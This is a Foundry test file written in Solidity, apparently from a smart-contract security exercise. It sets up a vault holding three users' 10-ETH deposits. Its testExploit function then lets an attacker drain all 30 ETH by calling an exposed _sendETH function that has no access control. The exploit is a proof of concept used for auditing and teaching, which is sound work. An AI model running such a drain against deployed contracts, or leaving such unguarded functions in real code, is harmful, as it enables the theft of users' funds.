// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IProtocolVault {
    function withdrawETH() external;
    function _sendETH(address to) external;
}

contract TestProtocolVault is Test {
    IProtocolVault vault;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    uint256 constant USER_DEPOSIT = 10 ether;

    function setUp() public {
        vm.prank(deployer);
        address payable _vault = payable(deployCode("ProtocolVault.sol"));
        vault = IProtocolVault(_vault);

        vm.deal(user1, USER_DEPOSIT);
        vm.deal(user2, USER_DEPOSIT);
        vm.deal(user3, USER_DEPOSIT);

        vm.prank(user1);
        (bool sent1,) = address(vault).call{value: USER_DEPOSIT}("");
        require(sent1, "User1 Transfer Failed");

        vm.prank(user2);
        (bool sent2,) = address(vault).call{value: USER_DEPOSIT}("");
        require(sent2, "User2 Transfer Failed");

        vm.prank(user3);
        (bool sent3,) = address(vault).call{value: USER_DEPOSIT}("");
        require(sent3, "User3 Transfer Failed");

        uint256 currentBalance = address(vault).balance;

        assertEq(currentBalance, USER_DEPOSIT * 3);

        vm.expectRevert();
        vm.prank(attacker);
        vault.withdrawETH();
    }

    function testExploit() public {
        console.log("Attackers Initial Balance: ", attacker.balance);

        vm.prank(attacker);
        vault._sendETH(attacker);

        console.log("Attackers Final Balance: ", attacker.balance);

        // Protocol Vault is empty and attacker has ~30+ ETH
        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, USER_DEPOSIT * 3);
    }
}
